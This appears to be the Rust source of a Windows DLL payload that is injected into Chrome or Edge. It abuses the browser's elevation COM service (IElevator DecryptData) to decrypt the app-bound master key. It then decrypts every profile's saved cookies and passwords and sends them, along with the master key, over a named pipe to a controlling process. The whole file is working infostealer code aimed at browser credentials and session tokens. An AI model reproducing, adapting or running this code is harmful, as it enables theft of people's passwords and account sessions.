use std::path::{Path};
use windows_sys::core::{HRESULT, IUnknown};
use windows_sys::Win32::Foundation::{HANDLE, INVALID_HANDLE_VALUE, GENERIC_READ, GENERIC_WRITE};
use windows_sys::Win32::System::Com::*;
use windows_sys::Win32::System::LibraryLoader::DisableThreadLibraryCalls;
use windows_sys::Win32::System::Threading::{CreateThread, GetCurrentProcessId};
use windows_sys::Win32::Storage::FileSystem::*;
use serde::{Deserialize, Serialize};
use aes_gcm::{Aes256Gcm, Key, Nonce, aead::Aead, KeyInit};

// --- Helper Macros and Types ---

#[allow(non_snake_case)]
fn FAILED(hr: HRESULT) -> bool {
    hr < 0
}

type BSTR = *mut u16;

#[link(name = "oleaut32")]
extern "system" {
    fn SysAllocStringByteLen(psz: *const i8, len: u32) -> BSTR;
    fn SysFreeString(bstr: BSTR);
    fn SysStringByteLen(bstr: BSTR) -> u32;
}

// --- COM Interface Definitions ---

#[repr(C)]
struct IElevator_Vtbl {
    pub QueryInterface: unsafe extern "system" fn(this: *mut IUnknown, iid: *const windows_sys::core::GUID, interface: *mut *mut std::ffi::c_void) -> HRESULT,
    pub AddRef: unsafe extern "system" fn(this: *mut IUnknown) -> u32,
    pub Release: unsafe extern "system" fn(this: *mut IUnknown) -> u32,
    pub RunRecoveryCRXElevated: unsafe extern "system" fn(this: *mut IUnknown, crx_path: *const u16, browser_appid: *const u16, browser_version: *const u16, language: *const u16, do_not_version_extension: u32, exit_code: *mut usize) -> HRESULT,
    pub EncryptData: unsafe extern "system" fn(this: *mut IUnknown, protection_level: i32, plaintext: BSTR, ciphertext: *mut BSTR, last_error: *mut u32) -> HRESULT,
    pub DecryptData: unsafe extern "system" fn(this: *mut IUnknown, ciphertext: BSTR, plaintext: *mut BSTR, last_error: *mut u32) -> HRESULT,
}

#[repr(C)]
struct IAvastElevator_Vtbl {
    pub QueryInterface: unsafe extern "system" fn(this: *mut IUnknown, iid: *const windows_sys::core::GUID, interface: *mut *mut std::ffi::c_void) -> HRESULT,
    pub AddRef: unsafe extern "system" fn(this: *mut IUnknown) -> u32,
    pub Release: unsafe extern "system" fn(this: *mut IUnknown) -> u32,
    pub RunRecoveryCRXElevated: unsafe extern "system" fn(this: *mut IUnknown, p1: *const u16, p2: *const u16, p3: *const u16, p4: *const u16, p5: u32, p6: *mut usize) -> HRESULT,
    pub UpdateSearchProviderElevated: unsafe extern "system" fn(this: *mut IUnknown, p1: *const u16) -> HRESULT,
    pub CleanupMigrateStateElevated: unsafe extern "system" fn(this: *mut IUnknown) -> HRESULT,
    pub UpdateInstallerLangElevated: unsafe extern "system" fn(this: *mut IUnknown, p1: *const u16) -> HRESULT,
    pub UpdateBrandValueElevated: unsafe extern "system" fn(this: *mut IUnknown, p1: *const u16) -> HRESULT,
    pub MigrateUninstallKeyElevated: unsafe extern "system" fn(this: *mut IUnknown, p1: *const u16) -> HRESULT,
    pub UpdateEndpointIdElevated: unsafe extern "system" fn(this: *mut IUnknown, p1: *const i8) -> HRESULT,
    pub UpdateFingerprintIdElevated: unsafe extern "system" fn(this: *mut IUnknown, p1: *const i8) -> HRESULT,
    pub RunMicroMVDifferentialUpdate: unsafe extern "system" fn(this: *mut IUnknown) -> HRESULT,
    pub EncryptData: unsafe extern "system" fn(this: *mut IUnknown, protection_level: i32, plaintext: BSTR, ciphertext: *mut BSTR, last_error: *mut u32) -> HRESULT,
    pub DecryptData: unsafe extern "system" fn(this: *mut IUnknown, ciphertext: BSTR, plaintext: *mut BSTR, last_error: *mut u32) -> HRESULT,
    pub DecryptData2: unsafe extern "system" fn(this: *mut IUnknown, ciphertext: BSTR, plaintext: *mut BSTR, last_error: *mut u32) -> HRESULT,
}

#[repr(C)]
struct MyIUnknown {
    pub lpVtbl: *const IElevator_Vtbl,
}

// --- Config (Internalized) ---

mod config {
    use super::*;
    use std::path::PathBuf;
    use windows_sys::Win32::Foundation::S_OK;

    pub struct BrowserConfig {
        pub name: &'static str,
        pub process_name: &'static str,
        pub clsid: windows_sys::core::GUID,
        pub iid: windows_sys::core::GUID,
        pub iid_v2: Option<windows_sys::core::GUID>,
        pub user_data_path: PathBuf,
    }
    const fn guid(data1: u32, data2: u16, data3: u16, data4: [u8; 8]) -> windows_sys::core::GUID {
        windows_sys::core::GUID { data1, data2, data3, data4 }
    }
    pub fn get_configs() -> Vec<BrowserConfig> {
        let mut local_app = PathBuf::new();
        unsafe {
            let mut path_ptr = std::ptr::null_mut();
            if windows_sys::Win32::UI::Shell::SHGetKnownFolderPath(&windows_sys::Win32::UI::Shell::FOLDERID_LocalAppData, 0, 0, &mut path_ptr) == S_OK {
                let mut len = 0;
                while *path_ptr.offset(len) != 0 { len += 1; }
                local_app = PathBuf::from(String::from_utf16_lossy(std::slice::from_raw_parts(path_ptr, len as usize)));
                CoTaskMemFree(path_ptr as *mut _);
            }
        }
        vec![
            BrowserConfig {
                name: "chrome",
                process_name: "chrome.exe",
                clsid: guid(0x708860E0, 0xF641, 0x4611, [0x88, 0x95, 0x7D, 0x86, 0x7D, 0xD3, 0x67, 0x5B]),
                iid: guid(0x463ABECF, 0x410D, 0x407F, [0x8A, 0xF5, 0x0D, 0xF3, 0x5A, 0x00, 0x5C, 0xC8]),
                iid_v2: Some(guid(0x1BF5208B, 0x295F, 0x4992, [0xB5, 0xF4, 0x3A, 0x9B, 0xB6, 0x49, 0x48, 0x38])),
                user_data_path: local_app.join("Google").join("Chrome").join("User Data"),
            },
            BrowserConfig {
                name: "edge",
                process_name: "msedge.exe",
                clsid: guid(0x1FCBE96C, 0x1697, 0x43AF, [0x91, 0x40, 0x28, 0x97, 0xC7, 0xC6, 0x97, 0x67]),
                iid: guid(0xC9C2B807, 0x7731, 0x4F34, [0x81, 0xB7, 0x44, 0xFF, 0x77, 0x79, 0x52, 0x2B]),
                iid_v2: Some(guid(0x8F7B6792, 0x784D, 0x4047, [0x84, 0x5D, 0x17, 0x82, 0xEF, 0xBE, 0xF2, 0x05])),
                user_data_path: local_app.join("Microsoft").join("Edge").join("User Data"),
            },
        ]
    }
}

// --- Data Structures ---

#[derive(Serialize, Deserialize)]
struct BrowserPayloadConfig {
    pub verbose: bool,
    pub fingerprint: bool,
    pub output_path: String,
    pub browser_type: String,
}

#[derive(Serialize, Deserialize, Debug)]
struct Cookie {
    host: String,
    name: String,
    path: String,
    is_secure: bool,
    is_httponly: bool,
    expires: i64,
    value: String,
}

#[derive(Serialize, Deserialize, Debug)]
struct Password {
    url: String,
    user: String,
    pass: String,
}

// --- Helper Functions ---

fn u16_str(s: &str) -> Vec<u16> {
    s.encode_utf16().chain(std::iter::once(0)).collect()
}

unsafe fn bstr_from_bytes(bytes: &[u8]) -> BSTR {
    SysAllocStringByteLen(bytes.as_ptr() as *const i8, bytes.len() as u32)
}

unsafe fn bytes_from_bstr(bstr: BSTR) -> Vec<u8> {
    if bstr.is_null() { return Vec::new(); }
    let len = SysStringByteLen(bstr);
    let slice = std::slice::from_raw_parts(bstr as *const u8, len as usize);
    slice.to_vec()
}

// --- Payload Core ---

struct Payload {
    pipe: HANDLE,
    config: BrowserPayloadConfig,
    master_key: Vec<u8>,
}

impl Payload {
    fn new() -> Option<Self> {
        let pid = unsafe { GetCurrentProcessId() };
        let pipe_name = format!("\\\\.\\pipe\\chromelevator_{}", pid);
        let name = u16_str(&pipe_name);
        unsafe {
            let pipe = CreateFileW(name.as_ptr(), GENERIC_READ | GENERIC_WRITE, 0, std::ptr::null(), OPEN_EXISTING, 0, 0);
            if pipe == INVALID_HANDLE_VALUE { return None; }

            let mut buf = [0u8; 1024];
            let mut read = 0;
            if ReadFile(pipe, buf.as_mut_ptr() as *mut _, buf.len() as u32, &mut read, std::ptr::null_mut()) == 0 {
                windows_sys::Win32::Foundation::CloseHandle(pipe);
                return None;
            }

            let config: BrowserPayloadConfig = serde_json::from_slice(&buf[..read as usize]).ok()?;
            Some(Self { pipe, config, master_key: Vec::new() })
        }
    }

    fn log(&self, msg: &str) {
        unsafe {
            let mut written = 0;
            let msg_bytes = format!("{}\n", msg);
            let _ = WriteFile(self.pipe, msg_bytes.as_ptr() as *const _, msg_bytes.len() as u32, &mut written, std::ptr::null_mut());
        }
    }

    fn run(&mut self) -> Result<(), Box<dyn std::error::Error>> {
        self.log("[+] Payload initialized");
        let browser_config = self.get_browser_config()?;
        let enc_key = self.get_encrypted_key(&browser_config.user_data_path.join("Local State"))?;
        self.master_key = self.decrypt_with_elevator(&browser_config, &enc_key)?;
        self.log(&format!("[+] KEY:{}", hex::encode(&self.master_key)));
        self.process_profiles(&browser_config)?;
        self.log("DONE");
        Ok(())
    }

    fn get_browser_config(&self) -> Result<config::BrowserConfig, Box<dyn std::error::Error>> {
        let configs = config::get_configs();
        configs.into_iter().find(|c| c.name == self.config.browser_type)
            .ok_or_else(|| "Unknown browser type".into())
    }

    fn get_encrypted_key(&self, local_state_path: &Path) -> Result<Vec<u8>, Box<dyn std::error::Error>> {
        let content = std::fs::read_to_string(local_state_path)?;
        let json: serde_json::Value = serde_json::from_str(&content)?;
        let b64_key = json["os_crypt"]["app_bound_encrypted_key"].as_str()
            .ok_or("app_bound_encrypted_key not found")?;
        if !b64_key.starts_with("APPB") { return Err("Not an APPB key".into()); }
        use base64::{Engine as _, engine::general_purpose};
        let data = general_purpose::STANDARD.decode(&b64_key[4..])?;
        Ok(data[4..].to_vec())
    }

    fn decrypt_with_elevator(&self, config: &config::BrowserConfig, enc_key: &[u8]) -> Result<Vec<u8>, Box<dyn std::error::Error>> {
        unsafe {
            CoInitializeEx(std::ptr::null(), COINIT_APARTMENTTHREADED as u32);
            let mut elevator: *mut IUnknown = std::ptr::null_mut();
            let mut hr = CoCreateInstance(&config.clsid, std::ptr::null_mut(), CLSCTX_LOCAL_SERVER, config.iid_v2.as_ref().unwrap_or(&config.iid), &mut elevator as *mut _ as *mut _);
            if FAILED(hr) && config.iid_v2.is_some() {
                 hr = CoCreateInstance(&config.clsid, std::ptr::null_mut(), CLSCTX_LOCAL_SERVER, &config.iid, &mut elevator as *mut _ as *mut _);
            }
            if FAILED(hr) { return Err(format!("CoCreateInstance failed: 0x{:08X}", hr).into()); }

            CoSetProxyBlanket(elevator as *mut _, 0xFFFFFFFF, 0xFFFFFFFF, std::ptr::null(), 6, 3, std::ptr::null(), 0x40);
            let bstr_enc = bstr_from_bytes(enc_key);
            let mut bstr_plain: BSTR = std::ptr::null_mut();
            let mut com_err: u32 = 0;
            let my_elevator = elevator as *mut MyIUnknown;
            if config.name == "avast" {
                let vtable = (*my_elevator).lpVtbl as *const IAvastElevator_Vtbl;
                hr = ((*vtable).DecryptData)(elevator, bstr_enc, &mut bstr_plain, &mut com_err);
            } else {
                let vtable = (*my_elevator).lpVtbl;
                hr = ((*vtable).DecryptData)(elevator, bstr_enc, &mut bstr_plain, &mut com_err);
            }
            SysFreeString(bstr_enc);
            if FAILED(hr) {
                ((*(*my_elevator).lpVtbl).Release)(elevator);
                CoUninitialize();
                return Err(format!("DecryptData failed: 0x{:08X}", hr).into());
            }
            let result = bytes_from_bstr(bstr_plain);
            SysFreeString(bstr_plain);
            ((*(*my_elevator).lpVtbl).Release)(elevator);
            CoUninitialize();
            Ok(result)
        }
    }

    fn process_profiles(&self, config: &config::BrowserConfig) -> Result<(), Box<dyn std::error::Error>> {
        for entry in std::fs::read_dir(&config.user_data_path)? {
            let entry = entry?;
            let path = entry.path();
            if path.is_dir() {
                if path.join("Network").join("Cookies").exists() || path.join("Login Data").exists() {
                    let _ = self.extract_profile_data(&path);
                }
            }
        }
        Ok(())
    }

    fn extract_profile_data(&self, profile_path: &Path) -> Result<(), Box<dyn std::error::Error>> {
        let profile_name = profile_path.file_name().unwrap_or_default().to_string_lossy();
        self.log(&format!("[*] Processing profile: {}", profile_name));
        let cookie_path = profile_path.join("Network").join("Cookies");
        if cookie_path.exists() { let _ = self.extract_cookies(&cookie_path); }
        let login_path = profile_path.join("Login Data");
        if login_path.exists() { let _ = self.extract_passwords(&login_path); }
        Ok(())
    }

    fn decrypt_blob(&self, blob: &[u8]) -> Option<Vec<u8>> {
        if blob.len() < 3 + 12 + 16 { return None; }
        if &blob[0..3] != b"v20" { return None; }
        let nonce = Nonce::from_slice(&blob[3..15]);
        let ciphertext = &blob[15..blob.len()-16];
        let cipher = Aes256Gcm::new(Key::<Aes256Gcm>::from_slice(&self.master_key));
        cipher.decrypt(nonce, aes_gcm::aead::Payload { msg: ciphertext, aad: b"" }).ok()
    }

    fn extract_cookies(&self, db_path: &Path) -> Result<(), Box<dyn std::error::Error>> {
        let temp_path = std::env::temp_dir().join(format!("c_{}.db", uuid::Uuid::new_v4()));
        std::fs::copy(db_path, &temp_path)?;
        let conn = rusqlite::Connection::open(&temp_path)?;
        let mut stmt = conn.prepare("SELECT host_key, name, encrypted_value FROM cookies")?;
        let mut count = 0;
        let rows = stmt.query_map([], |row| Ok((row.get::<_, String>(0)?, row.get::<_, String>(1)?, row.get::<_, Vec<u8>>(2)?)))?;
        for row in rows {
            if let Ok((host, name, enc_val)) = row {
                if let Some(decrypted) = self.decrypt_blob(&enc_val) {
                    let value = if decrypted.len() > 32 { String::from_utf8_lossy(&decrypted[32..]) } else { String::from_utf8_lossy(&decrypted) };
                    self.log(&format!("COOKIE: {} | {} = {}", host, name, value));
                    count += 1;
                }
            }
        }
        self.log(&format!("[+] Extracted {} cookies", count));
        let _ = std::fs::remove_file(temp_path);
        Ok(())
    }

    fn extract_passwords(&self, db_path: &Path) -> Result<(), Box<dyn std::error::Error>> {
        let temp_path = std::env::temp_dir().join(format!("p_{}.db", uuid::Uuid::new_v4()));
        std::fs::copy(db_path, &temp_path)?;
        let conn = rusqlite::Connection::open(&temp_path)?;
        let mut stmt = conn.prepare("SELECT origin_url, username_value, password_value FROM logins")?;
        let mut count = 0;
        let rows = stmt.query_map([], |row| Ok((row.get::<_, String>(0)?, row.get::<_, String>(1)?, row.get::<_, Vec<u8>>(2)?)))?;
        for row in rows {
            if let Ok((url, user, enc_pass)) = row {
                if let Some(decrypted) = self.decrypt_blob(&enc_pass) {
                    let pass = String::from_utf8_lossy(&decrypted);
                    self.log(&format!("PASS: {} | {} : {}", url, user, pass));
                    count += 1;
                }
            }
        }
        self.log(&format!("[+] Extracted {} passwords", count));
        let _ = std::fs::remove_file(temp_path);
        Ok(())
    }
}

// --- DLL Entry Point ---

#[no_mangle]
#[allow(non_snake_case)]
pub unsafe extern "system" fn DllMain(h_module: usize, reason: u32, _reserved: *mut std::ffi::c_void) -> i32 {
    if reason == 1 { // DLL_PROCESS_ATTACH
        DisableThreadLibraryCalls(h_module as _);
        let _ = CreateThread(std::ptr::null(), 0, Some(payload_thread), std::ptr::null_mut(), 0, std::ptr::null_mut());
    }
    1
}

unsafe extern "system" fn payload_thread(_param: *mut std::ffi::c_void) -> u32 {
    if let Some(mut payload) = Payload::new() {
        let _ = payload.run();
    }
    0
}

use hex;
